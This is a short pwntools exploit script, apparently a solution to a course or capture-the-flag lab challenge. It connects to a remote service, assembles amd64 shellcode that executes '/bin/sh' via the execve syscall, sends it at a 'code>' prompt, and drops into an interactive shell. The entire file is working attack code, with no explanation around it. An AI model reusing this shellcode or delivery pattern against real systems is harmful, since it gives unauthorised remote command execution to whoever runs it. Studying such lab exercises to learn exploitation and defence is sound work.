#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 10257

r = remote('up.zoolab.org', port)

shellcode = asm("""
    xor rax, rax           
    mov rbx, rax          

    push rbx               
    mov rdi, 0x68732f6e69622f 
    push rdi               
    mov rdi, rsp           
    push rbx               
    push rdi              
    mov rsi, rsp          

    push rbx              
    mov rdx, rsp          

    mov al, 59            
    syscall 
""")

r.recvuntil(b'code> ')
r.send(shellcode)
r.interactive()